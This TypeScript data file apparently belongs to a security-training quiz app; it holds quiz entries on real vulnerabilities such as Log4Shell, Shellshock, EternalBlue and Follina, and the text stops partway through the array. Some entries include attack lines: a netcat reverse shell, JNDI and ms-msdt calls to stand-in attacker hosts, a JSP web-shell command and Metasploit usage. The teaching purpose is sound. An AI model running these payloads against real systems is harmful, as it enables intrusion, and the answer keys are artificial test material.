import { SkillDomain } from '../types';

export interface DailyBreachIncident {
  id: string;
  dayIndex: number;
  title: string;
  cveId: string;
  threatActor: string;
  targetArchitecture: string;
  severity: 'CRITICAL' | 'HIGH' | 'MAXIMUM DEFCON';
  cvssScore: number;
  scenario: string;
  vulnerableCodeSnippet: string;
  codeLanguage: string;
  vulnerableLineNumber: number;
  prompt: string;
  options: {
    id: string;
    text: string;
    isCorrect: boolean;
    mitigation: string;
  }[];
  rootCauseAnalysis: {
    cwe: string;
    attackVector: string;
    historicalImpact: string;
    remediationPatch: string;
    terminalProof: string;
  };
  xpReward: number;
  eloReward: number;
}

export const DAILY_BREACHES: DailyBreachIncident[] = [
  {
    id: 'breach_xz_utils',
    dayIndex: 1,
    title: 'XZ Utils Supply Chain Backdoor',
    cveId: 'CVE-2024-3094',
    threatActor: 'Jia Tan (Advanced Persistent Threat / State-Sponsored)',
    targetArchitecture: 'OpenSSH (sshd) via liblzma on Debian/Fedora',
    severity: 'MAXIMUM DEFCON',
    cvssScore: 10.0,
    scenario: 'A sophisticated backdoor injected into the xz-utils build infrastructure hooks `RSA_public_decrypt` in OpenSSH via GNU indirect function (IFUNC) to hijack authentication and execute unauthenticated arbitrary code before sshd reaches login.',
    codeLanguage: 'c',
    vulnerableLineNumber: 4,
    vulnerableCodeSnippet: `// xz-utils m4 macro injection hook
1: static void _lzma_hook_openssh_init(void) {
2:   void *handle = dlopen("liblzma.so.5", RTLD_NOW);
3:   // Hook RSA verification routine in sshd
4:   void **rsa_func = (void**)dlsym(handle, "RSA_public_decrypt");
5:   if (rsa_func) *rsa_func = (void*)&backdoor_magic_payload_exec;
6: }`,
    prompt: 'Which technique allowed the backdoor to modify OpenSSH authentication flow without altering sshd source code directly?',
    options: [
      {
        id: 'xz_1',
        text: 'Hooking IFUNC resolver during systemd-notify dynamic linking in sshd',
        isCorrect: true,
        mitigation: 'Eliminate external pre-linking dependencies from sshd and audit upstream source tarballs.'
      },
      {
        id: 'xz_2',
        text: 'Injecting a DKMS kernel driver at server boot time',
        isCorrect: false,
        mitigation: 'Not applicable: the attack executes entirely within user-mode dynamic linker ld.so.'
      },
      {
        id: 'xz_3',
        text: 'Exploiting a traditional stack buffer overflow in ssh-keygen',
        isCorrect: false,
        mitigation: 'This is a multi-stage supply chain injection, not a memory buffer overflow.'
      },
      {
        id: 'xz_4',
        text: 'Bypassing iptables firewalls via encapsulated GRE frames',
        isCorrect: false,
        mitigation: 'The vulnerability targets application-layer RSA verification, not network encapsulation.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-506: Embedded Malicious Code (Supply Chain Attack)',
      attackVector: 'M4 macros in release tarballs altered build stages to inject obfuscated object code into test .lzma files.',
      historicalImpact: 'Would have granted unauthorized root SSH access to millions of Linux servers worldwide if not spotted by engineer Andres Freund due to a 500ms latency anomaly.',
      remediationPatch: 'Immediate rollback to xz-utils 5.4.x and removal of libsystemd linking from OpenSSH binaries.',
      terminalProof: '$ ssh -i id_rsa -o "CertificateInvalid=..." target-server\n[DEBUG] Backdoor signature payload triggered: root shell spawned'
    },
    xpReward: 80,
    eloReward: 25
  },
  {
    id: 'breach_log4shell',
    dayIndex: 2,
    title: 'Log4Shell: Zero-Click JNDI / LDAP RCE',
    cveId: 'CVE-2021-44228',
    threatActor: 'Mass Internet Scanning & Ransomware Groups',
    targetArchitecture: 'Apache Log4j 2.x Java Application Framework',
    severity: 'MAXIMUM DEFCON',
    cvssScore: 10.0,
    scenario: 'Log4j recursively evaluates expressions inside logged messages. When a log statement contains `${jndi:ldap://...}`, Log4j queries the remote LDAP server, downloading and dynamically executing an untrusted Java class.',
    codeLanguage: 'java',
    vulnerableLineNumber: 3,
    vulnerableCodeSnippet: `// Spring Boot Java Login Controller
1: @PostMapping("/login")
2: public ResponseEntity<?> login(@RequestHeader("User-Agent") String userAgent) {
3:     logger.info("Login attempt received from client: {}", userAgent);
4:     return ResponseEntity.ok("Handshake in progress");
5: }`,
    prompt: 'Which JVM runtime flag mitigates remote code execution via JNDI/LDAP as an immediate emergency workaround?',
    options: [
      {
        id: 'l4j_1',
        text: '-Dlog4j2.formatMsgNoLookups=true or removing JndiLookup.class',
        isCorrect: true,
        mitigation: 'Disables message lookups in log formats, preventing outbound JNDI queries.'
      },
      {
        id: 'l4j_2',
        text: '-Xmx4096m to allocate additional heap memory to the garbage collector',
        isCorrect: false,
        mitigation: 'Increasing memory allocation does not prevent remote class injection.'
      },
      {
        id: 'l4j_3',
        text: 'Setting HTTP Strict Transport Security (HSTS) to 31536000 seconds',
        isCorrect: false,
        mitigation: 'HSTS secures browser connections but does not sanitize backend log parsing.'
      },
      {
        id: 'l4j_4',
        text: 'Restarting Tomcat with chmod 777 permissions on /opt/tomcat',
        isCorrect: false,
        mitigation: 'Chmod 777 severely weakens local system security posture.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-917: Improper Neutralization of Special Elements used in an Expression Language Statement',
      attackVector: 'String injection in HTTP headers (User-Agent, X-Forwarded-For) or input forms processed by logger.',
      historicalImpact: 'Impacted over 80% of global enterprise Java infrastructure (Apple, Amazon AWS, Steam, VMware).',
      remediationPatch: 'Mandatory upgrade to Log4j 2.17.1+ and disabling JNDI protocols by default.',
      terminalProof: '$ curl -H "User-Agent: \${jndi:ldap://attacker.c2/Exploit.class}" https://target.corp/\n[+] LDAP query received on port 1389: Payload delivered!'
    },
    xpReward: 80,
    eloReward: 25
  },
  {
    id: 'breach_eternalblue',
    dayIndex: 3,
    title: 'EternalBlue SMBv1 Remote Kernel Pool Corruption',
    cveId: 'CVE-2017-0144',
    threatActor: 'Equation Group (NSA) / Shadow Brokers / WannaCry',
    targetArchitecture: 'Windows SMBv1 Server Kernel Driver (srv.sys)',
    severity: 'MAXIMUM DEFCON',
    cvssScore: 9.8,
    scenario: 'A discrepancy between 16-bit and 32-bit mathematical casting in handling SMB_COM_TRANSACTION2_SECONDARY triggers a buffer overflow in the Windows kernel non-paged pool (srv.sys), granting SYSTEM-level RCE.',
    codeLanguage: 'c',
    vulnerableLineNumber: 4,
    vulnerableCodeSnippet: `// SrvOs2FeaListSizeToNt() in srv.sys
1: ULONG SrvOs2FeaListSizeToNt(PFEALIST FeaList) {
2:   // Integer overflow in extended attribute list conversion
3:   USHORT listSize = FeaList->cbList;
4:   ULONG calculatedSize = (ULONG)listSize + 0x1000; // Integer Wrap-around!
5:   return calculatedSize;
6: }`,
    prompt: 'Which architectural network and OS configuration completely eliminates the EternalBlue attack surface?',
    options: [
      {
        id: 'eb_1',
        text: 'Permanently disabling SMBv1 and blocking inbound TCP ports 445 and 139 at the perimeter',
        isCorrect: true,
        mitigation: 'SMBv1 is an obsolete protocol; enforce modern encrypted SMBv3 only.'
      },
      {
        id: 'eb_2',
        text: 'Enabling Windows Defender Cloud Protection on port 80',
        isCorrect: false,
        mitigation: 'The exploit targets kernel SMB on port 445, not port 80.'
      },
      {
        id: 'eb_3',
        text: 'Enabling NTLMv1 instead of Kerberos on Domain Controllers',
        isCorrect: false,
        mitigation: 'NTLMv1 is insecure and unrelated to memory corruption in srv.sys.'
      },
      {
        id: 'eb_4',
        text: 'Broadening the subnet mask from /24 to /16 to isolate the gateway',
        isCorrect: false,
        mitigation: 'Expanding subnet size facilitates self-propagating wormable malware spread.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-190: Integer Overflow or Wraparound in Kernel Driver',
      attackVector: 'Malformed SMBv1 frames containing extended attributes (FEA List) with inconsistent sizes.',
      historicalImpact: 'Fueled the WannaCry and NotPetya ransomware pandemics, generating billions in global hospital and supply chain damages.',
      remediationPatch: 'Install Microsoft security bulletin MS17-010 and disable the `SMB1Protocol` Windows feature.',
      terminalProof: '$ msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.50; run"\n[+] Meterpreter session 1 opened (NT AUTHORITY\\SYSTEM)'
    },
    xpReward: 85,
    eloReward: 25
  },
  {
    id: 'breach_moveit',
    dayIndex: 4,
    title: 'MOVEit Transfer SQLi Pre-Auth Data Exfiltration',
    cveId: 'CVE-2023-34362',
    threatActor: 'Cl0p Ransomware Cartel (FIN11)',
    targetArchitecture: 'Progress MOVEit Transfer Web App (.NET / MySQL)',
    severity: 'CRITICAL',
    cvssScore: 9.8,
    scenario: 'An unsanitized HTTP header parameter in `guestaccess.aspx` enabled pre-authentication SQL Injection. Attackers altered session state to impersonate admin privileges and drop a stealth webshell (`human2.aspx`).',
    codeLanguage: 'csharp',
    vulnerableLineNumber: 3,
    vulnerableCodeSnippet: `// guestaccess.aspx handler in MOVEit.DMZ.ClassLib
1: string transactionId = Request.Headers["X-siLock-Transaction"];
2: if (!string.IsNullOrEmpty(transactionId)) {
3:     string query = "SELECT * FROM institutions WHERE InstID = '" + transactionId + "'";
4:     MySqlCommand cmd = new MySqlCommand(query, conn);
5:     MySqlDataReader reader = cmd.ExecuteReader();
6: }`,
    prompt: 'Which defensive programming principle would have prevented SQL payload execution in guestaccess.aspx?',
    options: [
      {
        id: 'mov_1',
        text: 'Strict use of Prepared Statements with strongly-typed parameters (MySqlParameter)',
        isCorrect: true,
        mitigation: 'Parameterized queries bind data to defined types, preventing quotes and SQL syntax hijacking.'
      },
      {
        id: 'mov_2',
        text: 'Encrypting the database disk volume with BitLocker',
        isCorrect: false,
        mitigation: 'BitLocker protects against physical disk theft, not online application-layer queries.'
      },
      {
        id: 'mov_3',
        text: 'Deploying self-signed TLS certificates signed with MD5 hashes',
        isCorrect: false,
        mitigation: 'MD5 is insecure and TLS transports SQL injection payloads unmodified.'
      },
      {
        id: 'mov_4',
        text: 'Stripping session cookies at the reverse proxy load balancer',
        isCorrect: false,
        mitigation: 'This vulnerability was pre-authentication and did not rely on pre-existing session cookies.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-89: SQL Injection in Unauthenticated Web Handlers',
      attackVector: 'Injecting SQL statements through user-controllable `X-siLock-Transaction` HTTP headers.',
      historicalImpact: 'Mass data exfiltration impacting hundreds of financial institutions, government agencies, and pension funds worldwide.',
      remediationPatch: 'Mandatory header sanitization and complete migration to parameterized queries in Entity Framework.',
      terminalProof: '$ curl -H "X-siLock-Transaction: 1\' OR 1=1--" https://transfer.corp/guestaccess.aspx\nHTTP/1.1 200 OK (Admin Session Token Forged)'
    },
    xpReward: 80,
    eloReward: 24
  },
  {
    id: 'breach_crowdstrike',
    dayIndex: 5,
    title: 'CrowdStrike Falcon Sensor IPC Null-Pointer Logic Fault',
    cveId: 'INCIDENT-2024-CS-01',
    threatActor: 'Channel File 291 Rapid Response Content Update',
    targetArchitecture: 'CSAgent.sys Kernel Driver on Windows 10/11 & Server',
    severity: 'MAXIMUM DEFCON',
    cvssScore: 9.9,
    scenario: 'The Falcon kernel sensor received `Channel File 291` containing 21 uninitialized logic fields. The `CSAgent.sys` driver dereferenced a null pointer into unmapped memory, triggering a PAGE_FAULT_IN_NONPAGED_AREA bugcheck (global BSOD).',
    codeLanguage: 'c',
    vulnerableLineNumber: 4,
    vulnerableCodeSnippet: `// CSAgent.sys Named Pipe Parser Routine
1: NTSTATUS EvaluateChannelRules(PCHANNEL_PACKET Packet) {
2:   PRULE_ENTRY Entry = Packet->RuleTable[Packet->ActiveRuleIndex];
3:   // Missing pointer sanity check before member access
4:   ULONG signatureId = Entry->SignaturePointer->Id; // NULL POINTER DEREFERENCE!
5:   return ProcessSignature(signatureId);
6: }`,
    prompt: 'Which ring-0 kernel Quality Assurance testing methodology prevents widespread outages from dynamic content updates?',
    options: [
      {
        id: 'cs_1',
        text: 'Formal schema input validation and staged ring-based canary deployments',
        isCorrect: true,
        mitigation: 'Roll out channel updates in progressive rings (0 -> 1 -> 2) and enforce bounds checking in driver parsers.'
      },
      {
        id: 'cs_2',
        text: 'Executing antivirus device drivers in user mode via Python interpreters',
        isCorrect: false,
        mitigation: 'EDR sensors require ring-0 hooks to monitor native syscalls in real time.'
      },
      {
        id: 'cs_3',
        text: 'Disabling Safe Mode across all enterprise Windows Server fleets',
        isCorrect: false,
        mitigation: 'Safe Mode was the primary mechanism allowing administrators to manually delete the offending channel file.'
      },
      {
        id: 'cs_4',
        text: 'Compiling kernel drivers without WHQL code signing integrity checks',
        isCorrect: false,
        mitigation: 'WHQL validates Microsoft code signing and kernel image integrity.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-476: NULL Pointer Dereference in Ring-0 Device Driver',
      attackVector: 'Dynamic distribution of unvalidated configuration content files to millions of enterprise endpoints simultaneously.',
      historicalImpact: '8.5 million Windows machines disabled in boot loops, grounding flights and disrupting healthcare facilities worldwide.',
      remediationPatch: 'Explicit verification `if (!Entry || !Entry->SignaturePointer) return STATUS_INVALID_DATA;` and staggered deployment waves.',
      terminalProof: 'CRITICAL_PROCESS_DIED: BugCheck 0x50 (PAGE_FAULT_IN_NONPAGED_AREA)\nArguments: ffff800000000000, 0000000000000000, fffff8012a4f1020, 0000000000000002'
    },
    xpReward: 85,
    eloReward: 25
  },
  {
    id: 'breach_heartbleed',
    dayIndex: 6,
    title: 'Heartbleed: OpenSSL TLS Heartbeat Memory Over-read',
    cveId: 'CVE-2014-0160',
    threatActor: 'Global Automated Scanners & Cyber Espionage',
    targetArchitecture: 'OpenSSL 1.0.1 through 1.0.1f on Linux/BSD Servers',
    severity: 'CRITICAL',
    cvssScore: 7.5,
    scenario: 'A missing bounds check in the OpenSSL implementation of the RFC 6520 TLS Heartbeat extension allows remote unauthenticated attackers to read up to 64KB of server memory per request, leaking private keys, tokens, and credentials.',
    codeLanguage: 'c',
    vulnerableLineNumber: 3,
    vulnerableCodeSnippet: `// OpenSSL ssl/t1_lib.c tls1_process_heartbeat
1: unsigned short payload_length = n2s(p); // Attacker supplies 64KB length
2: // MISSING: if (1 + 2 + payload_length + 16 > record_length) return 0;
3: memcpy(bp, pl, payload_length); // Reads past buffer into adjacent heap memory
4: r = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload_length + padding);`,
    prompt: 'What fundamental validation failure permitted Heartbleed to exfiltrate server private keys?',
    options: [
      {
        id: 'hb_1',
        text: 'Trusting the attacker-controlled 16-bit payload length without verifying it matched the actual TLS record length',
        isCorrect: true,
        mitigation: 'Implement strict bounds verification comparing requested payload length against incoming packet size.'
      },
      {
        id: 'hb_2',
        text: 'Integer overflow in the RSA modular exponentiation subroutine',
        isCorrect: false,
        mitigation: 'The vulnerability is a heap buffer over-read in TLS heartbeat, not an integer math overflow.'
      },
      {
        id: 'hb_3',
        text: 'Weak random number generation in the OpenSSL PRNG seed pool',
        isCorrect: false,
        mitigation: 'Entropy generation was intact; the flaw was direct memory disclosure.'
      },
      {
        id: 'hb_4',
        text: 'Null cipher negotiation downgrade over plain HTTP',
        isCorrect: false,
        mitigation: 'Heartbeat executes inside active encrypted TLS sessions.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-126: Buffer Over-read',
      attackVector: 'Attacker sends a 1-byte payload heartbeat with a fabricated length field of 65,535 bytes.',
      historicalImpact: 'Compromised millions of secure web servers, requiring global revocation and reissue of SSL/TLS certificates.',
      remediationPatch: 'Discard incoming heartbeat requests where `1 + 2 + payload + 16 > s->s3->rrec.length`.',
      terminalProof: '$ python3 heartbleed_poc.py vpn.corp.internal 443\n[DUMP] Found session cookie: SESSIONID=8f7e2a... [DUMP] RSA PRIVATE KEY fragment detected'
    },
    xpReward: 90,
    eloReward: 25
  },
  {
    id: 'breach_regresshion',
    dayIndex: 7,
    title: 'regreSSHion: OpenSSH Remote Signal Handler Race Condition',
    cveId: 'CVE-2024-6387',
    threatActor: 'Advanced Research Teams & Threat Groups',
    targetArchitecture: 'OpenSSH Server (sshd) on glibc-based Linux',
    severity: 'CRITICAL',
    cvssScore: 8.1,
    scenario: 'A signal handler race condition in sshd allows unauthenticated remote code execution as root. If a client does not authenticate within LoginGraceTime, SIGALRM triggers sigdie(), which calls async-signal-unsafe syslog().',
    codeLanguage: 'c',
    vulnerableLineNumber: 3,
    vulnerableCodeSnippet: `// OpenSSH sshd.c - sigdie signal handler
1: static void sigdie(int sig) {
2:   // syslog() is NOT async-signal-safe; internally calls malloc/free
3:   syslog(LOG_ERR, "Timeout before authentication for %s", get_remote_ipaddr());
4:   _exit(1);
5: }`,
    prompt: 'Why is invoking syslog() inside an asynchronous signal handler dangerous in sshd?',
    options: [
      {
        id: 'reg_1',
        text: 'syslog() allocates heap memory and is not async-signal-safe, causing race condition reentrancy deadlocks or heap exploitation',
        isCorrect: true,
        mitigation: 'Use only async-signal-safe functions (like write()) inside signal handlers or defer cleanup to main loop.'
      },
      {
        id: 'reg_2',
        text: 'It sends credentials over cleartext UDP port 514',
        isCorrect: false,
        mitigation: 'syslog() connects to the local /dev/log Unix domain socket, not remote UDP.'
      },
      {
        id: 'reg_3',
        text: 'It disables SELinux kernel enforcement policies automatically',
        isCorrect: false,
        mitigation: 'Signal handlers do not interact with kernel SELinux enforcement.'
      },
      {
        id: 'reg_4',
        text: 'It forces the SSH server to downgrade to SSHv1',
        isCorrect: false,
        mitigation: 'The vulnerability occurs during timeout handling, not protocol version negotiation.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition)',
      attackVector: 'Attacker initiates thousands of connections timed to interrupt glibc malloc/free structures via SIGALRM.',
      historicalImpact: 'Regressed a previously patched flaw from 2006 (CVE-2006-5051), exposing modern OpenSSH servers to root RCE.',
      remediationPatch: 'Remove syslog() from signal handlers; write raw static strings directly via write(STDERR_FILENO).',
      terminalProof: '$ ./regresshion_exploit target-host 22\n[INFO] Glitch race condition won: heap pointer hijacked -> root shell spawned on port 4444'
    },
    xpReward: 95,
    eloReward: 25
  },
  {
    id: 'breach_spring4shell',
    dayIndex: 8,
    title: 'Spring4Shell: Spring Core ClassLoader Property Injection',
    cveId: 'CVE-2022-22965',
    threatActor: 'Web Application Exploiters & Botnets',
    targetArchitecture: 'Spring Framework on JDK 9+ running Apache Tomcat',
    severity: 'MAXIMUM DEFCON',
    cvssScore: 9.8,
    scenario: 'Spring MVC parameter binding allows remote attackers to access ClassLoader internals via `class.module.classLoader`. On Apache Tomcat, attackers modify AccessLogValve properties to write a web shell into the document root.',
    codeLanguage: 'java',
    vulnerableLineNumber: 2,
    vulnerableCodeSnippet: `// Spring DataBinder HTTP parameter property binding payload
1: POST /helloworld HTTP/1.1
2: class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c}i
3: class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
4: class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT`,
    prompt: 'How did Spring4Shell exploit Spring MVC parameter binding on Java 9+?',
    options: [
      {
        id: 's4s_1',
        text: 'By traversing java.lang.Module via getModule() on Class objects to manipulate Tomcat AccessLogValve properties',
        isCorrect: true,
        mitigation: 'Restrict allowed property fields in DataBinder or disallow ClassLoader traversal.'
      },
      {
        id: 's4s_2',
        text: 'By sending malicious serialized Java objects via RMI registry port 1099',
        isCorrect: false,
        mitigation: 'Spring4Shell is HTTP form parameter binding, not native RMI deserialization.'
      },
      {
        id: 's4s_3',
        text: 'By abusing a SQL injection flaw in Spring Data JPA repositories',
        isCorrect: false,
        mitigation: 'The flaw targets Spring Core parameter binding, not database persistence queries.'
      },
      {
        id: 's4s_4',
        text: 'By exploiting a path traversal in Spring Cloud Config server',
        isCorrect: false,
        mitigation: 'The vulnerability is in Spring Framework DataBinder, not Cloud Config.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-94: Improper Control of Generation of Code',
      attackVector: 'HTTP POST parameters bind properties of the Java 9 Module system to change Tomcat access log path to a .jsp web shell.',
      historicalImpact: 'Mass scanning and automated webshell drop across enterprise Spring applications worldwide.',
      remediationPatch: 'Upgrade to Spring Framework 5.3.18 / 5.2.20; explicitly disallow `class.module.*` property paths.',
      terminalProof: '$ curl -X POST -d "class.module.classLoader...pattern=<%Runtime.getRuntime().exec(request.getParameter(\\"cmd\\"));%>" http://target/app\n$ curl http://target/shell.jsp?cmd=id\nuid=0(root) gid=0(root)'
    },
    xpReward: 90,
    eloReward: 25
  },
  {
    id: 'breach_dirty_pipe',
    dayIndex: 9,
    title: 'Dirty Pipe: Linux Kernel Arbitrary Page Cache Overwrite',
    cveId: 'CVE-2022-0847',
    threatActor: 'Local Users & Container Escape Vector',
    targetArchitecture: 'Linux Kernel 5.8 through 5.16.10',
    severity: 'HIGH',
    cvssScore: 7.8,
    scenario: 'An uninitialized pipe buffer flags flaw in the Linux kernel allows an unprivileged local attacker to overwrite data in read-only page cache files, enabling instant local privilege escalation by modifying /etc/passwd or SUID binaries.',
    codeLanguage: 'c',
    vulnerableLineNumber: 4,
    vulnerableCodeSnippet: `// Linux kernel fs/splice.c - copy_page_to_iter_pipe
1: static ssize_t copy_page_to_iter_pipe(struct page *page, ...) {
2:   // splice() creates a reference to page cache without initializing buf->flags
3:   // Prior write left PIPE_BUF_FLAG_CAN_MERGE active!
4:   pipe->bufs[pipe->head & mask].page = page; // Can now write directly into read-only cache
5: }`,
    prompt: 'What allowed an unprivileged user to overwrite /etc/passwd in page cache via Dirty Pipe?',
    options: [
      {
        id: 'dp_1',
        text: 'Failure to clear PIPE_BUF_FLAG_CAN_MERGE on new page references permitted writing into existing read-only page cache pages',
        isCorrect: true,
        mitigation: 'Explicitly reset `buf->flags = 0` when adding new page references in copy_page_to_iter_pipe.'
      },
      {
        id: 'dp_2',
        text: 'Kernel stack overflow via deep directory recursion in sys_chroot',
        isCorrect: false,
        mitigation: 'The bug is in anonymous pipe splice logic, not directory traversal.'
      },
      {
        id: 'dp_3',
        text: 'Broken file permissions on /dev/kmem device node',
        isCorrect: false,
        mitigation: 'Modern distributions restrict /dev/kmem; Dirty Pipe exploits page cache splicing.'
      },
      {
        id: 'dp_4',
        text: 'Missing eBPF bytecode verifier bounds checking',
        isCorrect: false,
        mitigation: 'Dirty Pipe operates purely through pipe() and splice() syscalls without eBPF.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-665: Improper Initialization',
      attackVector: 'Attacker fills a pipe with data, drains it to set the CAN_MERGE flag, then splices a target read-only file and writes replacement data.',
      historicalImpact: 'Complete local root privilege escalation on Android devices and Linux server distributions.',
      remediationPatch: 'Initialize `buf->flags = 0` in `copy_page_to_iter_pipe()` before referencing target pages.',
      terminalProof: '$ ./dirtypipe /etc/passwd 1 "root:0:0:..."\n$ su -\n# id\nuid=0(root) gid=0(root)'
    },
    xpReward: 85,
    eloReward: 25
  },
  {
    id: 'breach_pwnkit',
    dayIndex: 10,
    title: 'PwnKit: Polkit pkexec SUID Argument Injection',
    cveId: 'CVE-2021-4034',
    threatActor: 'Red Teams & Commodity Ransomware',
    targetArchitecture: 'polkit pkexec on systemd Linux distributions',
    severity: 'HIGH',
    cvssScore: 7.8,
    scenario: 'Polkit pkexec processes command-line arguments without verifying that argc is greater than zero. When argc is 0, pkexec reads argv[1] out of bounds, which points directly to envp[0], allowing controlled environment variable injection.',
    codeLanguage: 'c',
    vulnerableLineNumber: 3,
    vulnerableCodeSnippet: `// polkit pkexec.c main()
1: for (n = 1; n < argc; n++) { ... }
2: // When executed with argc == 0, n is initialized to 1 > argc!
3: path = g_strdup(argv[n]); // Out-of-bounds read into envp[0]
4: g_find_program_in_path(path); // Writes result back into envp[0], introducing GCONV_PATH`,
    prompt: 'How was pkexec induced to read out of bounds when executed with an empty argument array?',
    options: [
      {
        id: 'pk_1',
        text: 'Executing pkexec with argc=0 causes argv[1] to point directly to envp[0], allowing environment variable injection',
        isCorrect: true,
        mitigation: 'Enforce `if (argc < 1) return 1;` at the very beginning of main() in all SUID binaries.'
      },
      {
        id: 'pk_2',
        text: 'Overwriting the polkit Unix socket via symlink race condition in /tmp',
        isCorrect: false,
        mitigation: 'PwnKit does not use sockets or symlinks; it exploits argc parsing.'
      },
      {
        id: 'pk_3',
        text: 'Triggering an infinite loop in D-Bus authentication policies',
        isCorrect: false,
        mitigation: 'The vulnerability occurs before pkexec connects to system D-Bus.'
      },
      {
        id: 'pk_4',
        text: 'Injecting malicious shell aliases into the root user profile',
        isCorrect: false,
        mitigation: 'pkexec does not source shell alias files.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-787: Out-of-bounds Write',
      attackVector: '`execve("/usr/bin/pkexec", [], envp)` introduces an unconstrained environment variable to load an arbitrary shared library via GCONV_PATH.',
      historicalImpact: 'Existed dormant for over 12 years in all default installations of Ubuntu, Debian, Fedora, and CentOS.',
      remediationPatch: 'Add check: `if (argc < 1) { exit(1); }` in pkexec main routine.',
      terminalProof: '$ ./pwnkit\n[+] Overwriting GCONV_PATH...\n[+] pkexec executed as root: uid=0(root) gid=0(root)'
    },
    xpReward: 85,
    eloReward: 25
  },
  {
    id: 'breach_shellshock',
    dayIndex: 11,
    title: 'Shellshock: GNU Bash Environment Function Injection',
    cveId: 'CVE-2014-6271',
    threatActor: 'Worm Operators & Remote CGI Exploiters',
    targetArchitecture: 'GNU Bash through version 4.3 on Unix/Linux',
    severity: 'MAXIMUM DEFCON',
    cvssScore: 10.0,
    scenario: 'GNU Bash allows function definitions in environment variables. Bash continued parsing commands past the end of the function definition, executing arbitrary trailing commands immediately upon invocation in CGI scripts, OpenSSH ForceCommand, and DHCP clients.',
    codeLanguage: 'bash',
    vulnerableLineNumber: 2,
    vulnerableCodeSnippet: `// Bash environment function definition vulnerability
1: # When bash initializes an environment variable starting with "() {"
2: export HTTP_USER_AGENT='() { :;}; /bin/bash -c "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker 4444 >/tmp/f"'
3: # Bash parses the function, but continues executing trailing commands!`,
    prompt: 'Why did bash execute arbitrary commands when parsing environment function definitions?',
    options: [
      {
        id: 'ss_1',
        text: 'Bash continued parsing and evaluating shell commands beyond the closing brace of function definitions in environment variables',
        isCorrect: true,
        mitigation: 'Prefix environment function names and terminate parser evaluation strictly at the function closing brace.'
      },
      {
        id: 'ss_2',
        text: 'Bash executed untrusted code because it ran setuid root by default',
        isCorrect: false,
        mitigation: 'Bash drops root privileges if invoked as SUID unless explicitly passed -p.'
      },
      {
        id: 'ss_3',
        text: 'Buffer overflow in readline library during interactive terminal input',
        isCorrect: false,
        mitigation: 'The flaw is in bash variables parser (variables.c), not the readline library.'
      },
      {
        id: 'ss_4',
        text: 'Heap spray through recursive alias expansion',
        isCorrect: false,
        mitigation: 'The issue is direct command evaluation upon environment initialization.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-78: Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)',
      attackVector: 'Attacker supplies malicious User-Agent header to an Apache mod_cgi web server, triggering unauthenticated shell execution.',
      historicalImpact: 'Weaponized within hours to create botnets, compromise web servers, and breach enterprise perimeters.',
      remediationPatch: 'Only allow functions with prefix `BASH_FUNC_` and stop parsing after closing brace `}`.',
      terminalProof: '$ curl -H "User-Agent: () { :;}; echo Content-Type: text/plain; echo; /bin/uname -a" http://target/cgi-bin/test\nLinux target-server 3.2.0-4-amd64 #1 SMP'
    },
    xpReward: 90,
    eloReward: 25
  },
  {
    id: 'breach_follina',
    dayIndex: 12,
    title: 'Follina: Microsoft Support Diagnostic Tool MSDT RCE',
    cveId: 'CVE-2022-30190',
    threatActor: 'Nation-State Phishing & Malicious Office Docs',
    targetArchitecture: 'Microsoft Windows & Microsoft Office (Word)',
    severity: 'HIGH',
    cvssScore: 7.8,
    scenario: 'A zero-day vulnerability in MSDT allows arbitrary PowerShell execution via Microsoft Word documents. When Word opens an external HTML relationship, the `ms-msdt:` protocol URI scheme executes code even when macros are completely disabled.',
    codeLanguage: 'xml',
    vulnerableLineNumber: 3,
    vulnerableCodeSnippet: `<!-- Word document.xml.rels external relationship payload -->
1: <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
2:   Target="http://attacker.com/malicious.html" TargetMode="External"/>
3: <!-- malicious.html invokes protocol: ms-msdt:/id PCWDiagnostic /skip force /param "IT_BrowseForFile=$(powershell calc.exe)" -->`,
    prompt: 'How did Follina execute malicious PowerShell code from Word documents even with Office Macros disabled?',
    options: [
      {
        id: 'fol_1',
        text: 'Word loaded an external HTML template invoking the ms-msdt: protocol URI scheme, executing arbitrary PowerShell parameters without macros',
        isCorrect: true,
        mitigation: 'Disable the ms-msdt URL protocol handler in the Windows Registry or apply KB updates.'
      },
      {
        id: 'fol_2',
        text: 'VBA macro bytecode injection in legacy Word 97-2003 .doc format',
        isCorrect: false,
        mitigation: 'Follina works in modern .docx files without VBA or macro enablement.'
      },
      {
        id: 'fol_3',
        text: 'Memory corruption in Microsoft Word OpenXML parser schema validator',
        isCorrect: false,
        mitigation: 'The flaw relies on Windows URI protocol handler invocation, not memory corruption.'
      },
      {
        id: 'fol_4',
        text: 'Bypassing Windows Defender via DLL side-loading in WINWORD.EXE',
        isCorrect: false,
        mitigation: 'The attack vectors msdt.exe directly through URI delegation.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-78: OS Command Injection via Protocol Handler',
      attackVector: 'Crafted Word document downloads an external HTML file invoking `ms-msdt:` with PowerShell commands embedded in diagnostic parameters.',
      historicalImpact: 'Exploited in targeted espionage against international government agencies and defense contractors.',
      remediationPatch: 'Unregister the `ms-msdt` protocol handler via `reg delete HKEY_CLASSES_ROOT\\ms-msdt /f`.',
      terminalProof: '$ cat document.xml.rels | grep -i ms-msdt\n[ALERT] ms-msdt:/id PCWDiagnostic payload found -> spawned powershell.exe with Parent PID: winword.exe'
    },
    xpReward: 85,
    eloReward: 25
  },
  {
